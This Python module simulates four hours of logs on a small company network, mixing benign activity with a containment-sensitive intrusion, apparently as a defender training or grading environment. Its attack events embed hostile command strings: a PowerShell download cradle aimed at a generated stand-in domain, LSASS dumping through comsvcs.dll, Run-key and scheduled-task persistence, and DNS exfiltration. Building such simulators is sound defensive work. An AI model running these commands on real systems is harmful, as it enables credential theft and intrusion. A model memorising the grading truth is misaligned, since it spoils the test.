"""A small company network over four hours, with an intrusion that only progresses while it can.

Benign activity (people at work, administrators logging on to servers, IT scheduled tasks, the
nightly backup pulling data from the file server) is generated up front. The intrusion is a plan
of steps (initial access, discovery, credential dumping, lateral movement with a stolen admin
account, persistence, exfiltration), each with a time and preconditions: a step happens only if
the host it runs from is not isolated and the account it uses is not disabled. Events for a step
exist only once the step has happened, so containment changes what the logs will show.

The events are realistic in shape (logons, process launches with command lines, DNS queries,
network flows) and contain no working attack code: command lines are the strings defenders see in
their logs.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field
from typing import Any

import numpy as np

from .. import config

COMMON_DOMAINS = ["outlook.office.com", "teams.microsoft.com", "www.google.com", "github.com", "slack.com", "intranet.corp.local", "cdn.jsdelivr.net"]
APPS = ["chrome.exe", "outlook.exe", "excel.exe", "winword.exe", "teams.exe", "code.exe", "acrord32.exe"]


@dataclass
class Host:
    name: str
    kind: str                  # workstation | server
    owner: str | None = None
    critical: bool = False     # the domain controller


@dataclass
class Step:
    t: int
    kind: str
    host: str                  # where it runs
    src: str | None = None     # where it comes from (lateral movement)
    account: str | None = None
    done: bool = False


@dataclass
class Scenario:
    seed: int
    family: str
    hosts: list[Host]
    users: list[str]
    admins: list[str]
    events: list[dict[str, Any]]           # benign, plus attack events as they happen
    plan: list[Step]
    initial_access: str
    exfil_kind: str
    attacker_ip: str
    rare_domain: str
    isolated: set[str] = field(default_factory=set)
    disabled: set[str] = field(default_factory=set)
    compromised: set[str] = field(default_factory=set)
    stolen: set[str] = field(default_factory=set)
    exfiltrated: bool = False
    now: int = 0
    ended_at: int = 0
    stealthy: set[str] = field(default_factory=set)

    def host(self, name: str) -> Host:
        return next(h for h in self.hosts if h.name == name)

    # ------------------------------------------------------------------ dynamics
    def advance(self, until: int) -> None:
        """Run the attacker's plan up to tick `until` (exclusive), respecting containment."""
        while self.now < until:
            for st in self.plan:
                if st.done or st.t != self.now:
                    continue
                if self._can(st):
                    self._do(st)
                else:
                    # a blocked step waits; it retries on the next tick while time remains
                    st.t += 1
            self.now += 1

    def _can(self, st: Step) -> bool:
        if st.kind == "initial":
            return st.host not in self.isolated and (st.account not in self.disabled)
        src = st.src or st.host
        if src not in self.compromised or src in self.isolated or st.host in self.isolated:
            return False
        if st.account and st.account in self.disabled:
            return False
        if st.kind == "lateral" and st.account not in self.stolen:
            return False
        return True

    def _do(self, st: Step) -> None:
        st.done = True
        ev = self.events
        t = self.now
        if st.kind == "initial":
            self.compromised.add(st.host)
            if self.initial_access == "phish":
                enc = base64.b64encode(f"IEX (New-Object Net.WebClient).DownloadString('https://{self.rare_domain}/a')".encode("utf-16le")).decode()
                if "initial" in self.stealthy:
                    ev.append(_proc(t, st.host, st.account, "winword.exe", "rundll32.exe", rf"rundll32.exe C:\Users\{st.account}\AppData\Local\Temp\m.dll,Start"))
                else:
                    ev.append(_proc(t, st.host, st.account, "winword.exe", "powershell.exe", f"powershell.exe -nop -w hidden -enc {enc[:60]}"))
                ev.append(_dns(t, st.host, self.rare_domain))
                ev.append(_net(t, st.host, self.attacker_ip, 443, 41_000))
            else:
                ev.append(_auth(t, st.host, st.account, self.attacker_ip, "success", "remote"))
                ev.append(_proc(t, st.host, st.account, "explorer.exe", "powershell.exe", "powershell.exe -nop"))
        elif st.kind == "discovery":
            for cmd in ("whoami /all", 'net group "domain admins" /domain', "nltest /dclist:corp.local"):
                ev.append(_proc(t, st.host, st.account, "powershell.exe", cmd.split()[0] + ".exe", cmd))
        elif st.kind == "dump":
            if "dump" in self.stealthy:
                ev.append(_proc(t, st.host, st.account, "powershell.exe", "werfault.exe", r"werfault.exe -u -p 624 -ip 0 -s 1032"))
            else:
                ev.append(_proc(t, st.host, st.account, "powershell.exe", "rundll32.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\d.bin full"))
            self.stolen.add(st.account or "")
        elif st.kind == "lateral":
            ev.append(_auth(t, st.host, st.account, st.src, "success", "network"))
            ev.append(_proc(t, st.host, st.account, "services.exe", "cmd.exe", r"cmd.exe /c C:\Windows\Temp\svc.exe"))
            self.compromised.add(st.host)
        elif st.kind == "persist":
            if "persist" in self.stealthy:
                ev.append(_proc(t, st.host, st.account, "cmd.exe", "reg.exe", r"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Sync /d C:\ProgramData\s.exe"))
            else:
                ev.append(_proc(t, st.host, st.account, "cmd.exe", "schtasks.exe", r'schtasks /create /tn "OneDrive Sync" /tr C:\Users\Public\upd.exe /sc onlogon'))
        elif st.kind == "exfil":
            if self.exfil_kind == "dns":
                rng = np.random.default_rng(self.seed + t)
                for _ in range(6):
                    label = "".join(rng.choice(list("abcdefghijklmnopqrstuvwxyz0123456789"), 40))
                    ev.append(_dns(t, st.host, f"{label}.{self.rare_domain}"))
            else:
                ev.append(_net(t, st.host, self.attacker_ip, 443, 380_000_000))
            self.exfiltrated = True

    def finish(self) -> None:
        """After the defender stops: let the attack run to the horizon plus the grace period."""
        c = config.load("soc")
        self.advance(c["horizon"] + c["grace"])

    def visible(self) -> list[dict[str, Any]]:
        return [e for e in self.events if e["t"] < self.now]


# ---------------------------------------------------------------------- event helpers
def _proc(t: int, host: str, user: str | None, parent: str, image: str, cmd: str) -> dict[str, Any]:
    return {"t": t, "type": "process", "host": host, "user": user, "parent": parent, "image": image, "cmdline": cmd}


def _auth(t: int, host: str, user: str | None, src: str | None, result: str, logon: str) -> dict[str, Any]:
    return {"t": t, "type": "auth", "host": host, "user": user, "src": src, "result": result, "logon_type": logon}


def _dns(t: int, host: str, q: str) -> dict[str, Any]:
    return {"t": t, "type": "dns", "host": host, "query": q}


def _net(t: int, host: str, dst: str, port: int, nbytes: int) -> dict[str, Any]:
    return {"t": t, "type": "net", "host": host, "dst": dst, "port": port, "bytes_out": nbytes}


def family(name: str) -> dict[str, Any]:
    fams = config.load("soc")["families"]
    if name in fams:
        return fams[name]
    from pathlib import Path

    import yaml

    p = Path(config.ROOT) / "heldout" / f"{name}.yaml"
    return yaml.safe_load(p.read_text())["family"]


def _choice(rng: np.random.Generator, probs: dict[str, float]) -> str:
    keys = list(probs)
    p = np.array([probs[k] for k in keys], dtype=float)
    return str(rng.choice(keys, p=p / p.sum()))


def make_scenario(seed: int, fam_name: str = "corp-small") -> Scenario:
    fam = family(fam_name)
    rng = np.random.default_rng(seed)
    T = config.load("soc")["horizon"] + config.load("soc")["grace"]
    n_ws = int(rng.integers(fam["workstations"][0], fam["workstations"][1] + 1))
    n_adm = int(rng.integers(fam["admins"][0], fam["admins"][1] + 1))
    users = [f"u{i:02d}" for i in range(n_ws)]
    admins = [f"adm-{u}" for u in users[:n_adm]]       # the first users are IT, with separate admin accounts
    hosts = [Host(f"ws-{i:02d}", "workstation", users[i]) for i in range(n_ws)]
    hosts += [Host("dc-01", "server", critical=True), Host("file-01", "server"), Host("web-01", "server"), Host("backup-01", "server")]
    servers = [h.name for h in hosts if h.kind == "server"]
    ev: list[dict[str, Any]] = []

    # ------------------------------------------------------------------ benign
    for i, u in enumerate(users):
        start = int(rng.integers(0, 6))
        ev.append(_auth(start, f"ws-{i:02d}", u, None, "success", "interactive"))
        for t in range(start, T):
            if rng.random() < 0.35:
                ev.append(_proc(t, f"ws-{i:02d}", u, "explorer.exe", str(rng.choice(APPS)), ""))
            if rng.random() < 0.4:
                ev.append(_dns(t, f"ws-{i:02d}", str(rng.choice(COMMON_DOMAINS))))
            if rng.random() < 0.02:
                ev.append(_auth(t, f"ws-{i:02d}", u, None, "failure", "interactive"))
            if rng.random() < 0.02:
                ev.append(_proc(t, f"ws-{i:02d}", u, "excel.exe", "splwow64.exe", "splwow64.exe 8192"))
    for k, a in enumerate(admins):
        own = f"ws-{k:02d}"
        for t in range(T):
            if rng.random() < fam["admin_remote_rate"]:
                srv = str(rng.choice(servers))
                ev.append(_auth(t, srv, a, own, "success", "network"))
            if rng.random() < fam["encoded_ps_rate"]:
                enc = base64.b64encode("Get-ADUser -Filter * | Export-Csv users.csv".encode("utf-16le")).decode()
                ev.append(_proc(t, own, a, "explorer.exe", "powershell.exe", f"powershell.exe -enc {enc[:60]}"))
    ws_names = [f"ws-{i:02d}" for i in range(n_ws)]
    for t in range(T):
        if admins and rng.random() < fam["helpdesk_rate"]:
            # helpdesk: an admin logs on to someone's workstation, sometimes hops on to a server from there
            ws = str(rng.choice(ws_names))
            a = str(rng.choice(admins))
            ev.append(_auth(t, ws, a, f"ws-{admins.index(a):02d}", "success", "network"))
            if rng.random() < 0.5:
                ev.append(_auth(t, str(rng.choice(servers)), a, ws, "success", "network"))
        if rng.random() < fam["appdata_task_rate"]:
            ws = str(rng.choice(ws_names))
            ev.append(_proc(t, ws, users[ws_names.index(ws)], "setup.exe", "schtasks.exe",
                            r'schtasks /create /tn "UpdaterTaskUser" /tr C:\Users\Public\Updater\update.exe /sc hourly'))
        for i, u in enumerate(users):
            if rng.random() < fam["macro_rate"]:
                ev.append(_proc(t, ws_names[i], u, "excel.exe", "cmd.exe", "cmd.exe /c copy report.csv \\\\file-01\\reports"))
            if rng.random() < fam["cdn_rate"]:
                label = "".join(rng.choice(list("0123456789abcdef"), 32))
                ev.append(_dns(t, ws_names[i], f"{label}.cloudfront.net"))
            if rng.random() < fam["upload_rate"]:
                ev.append(_net(t, ws_names[i], f"198.51.100.{int(rng.integers(2, 250))}", 443, int(rng.integers(50, 400)) * 1_000_000))
        if rng.random() < fam["it_task_rate"]:
            h = str(rng.choice([h.name for h in hosts]))
            ev.append(_proc(t, h, "SYSTEM", "svchost.exe", "schtasks.exe", r'schtasks /create /tn "Defender Update" /tr "C:\Program Files\Defender\update.exe" /sc daily'))
    bt = int(rng.integers(fam["backup_ticks"][0], fam["backup_ticks"][1] + 1))
    ev.append(_net(bt, "file-01", "backup-01", 445, 2_400_000_000))
    ev.append(_auth(bt, "file-01", "svc-backup", "backup-01", "success", "network"))

    # ------------------------------------------------------------------ the intrusion plan
    initial = _choice(rng, fam["initial_access"])
    exfil = _choice(rng, fam["exfil"])
    victim_i = int(rng.integers(n_adm, n_ws)) if n_ws > n_adm else 0
    victim, vuser = f"ws-{victim_i:02d}", users[victim_i]
    attacker_ip = f"203.0.113.{int(rng.integers(2, 250))}"
    rare = "".join(rng.choice(list("bcdfghjklmnpqrstvwxz"), 7)) + str(rng.choice([".top", ".xyz", ".info"]))
    t0 = int(rng.integers(3, 10))
    if initial == "spray":
        for k in range(int(rng.integers(8, 16))):
            tt = max(0, t0 - 3 + k // 5)
            tgt = f"ws-{int(rng.integers(0, n_ws)):02d}"
            ev.append(_auth(tt, tgt, str(rng.choice(users)), attacker_ip, "failure", "remote"))
    stolen = str(rng.choice(admins))
    plan = [Step(t0, "initial", victim, account=vuser)]
    t = t0 + int(rng.integers(1, 3))
    plan.append(Step(t, "discovery", victim, account=vuser))
    t += int(rng.integers(2, 6))
    plan.append(Step(t, "dump", victim, account=stolen))
    hops = int(rng.integers(fam["lateral_hops"][0], fam["lateral_hops"][1] + 1))
    src = victim
    others = [h.name for h in hosts if h.kind == "workstation" and h.name != victim]
    targets = list(rng.choice(others, size=min(hops - 1, len(others)), replace=False)) + ["file-01"]
    for tgt in targets:
        t += int(rng.integers(2, 6))
        plan.append(Step(t, "lateral", str(tgt), src=src, account=stolen))
        src = str(tgt)
    t += int(rng.integers(1, 4))
    plan.append(Step(t, "persist", "file-01", src="file-01", account=stolen))
    t += int(rng.integers(4, 12))
    plan.append(Step(t, "exfil", "file-01", src="file-01", account=stolen))
    ev.sort(key=lambda e: e["t"])
    sc = Scenario(seed, fam_name, hosts, users + admins + ["svc-backup"], admins, ev, plan, initial, exfil, attacker_ip, rare)
    sc.stealthy = {st.kind for st in plan if rng.random() < fam.get("stealth", 0.0)}
    return sc


def truth(sc: Scenario) -> dict[str, Any]:
    """What happened (for grading only): every host the attacker ever reached, the stolen account."""
    hosts = {st.host for st in sc.plan if st.kind in ("initial", "lateral")}
    acct = {st.account for st in sc.plan if st.kind == "dump"}
    return {"hosts": sorted(hosts), "accounts": sorted(a for a in acct if a), "initial_access": sc.initial_access}
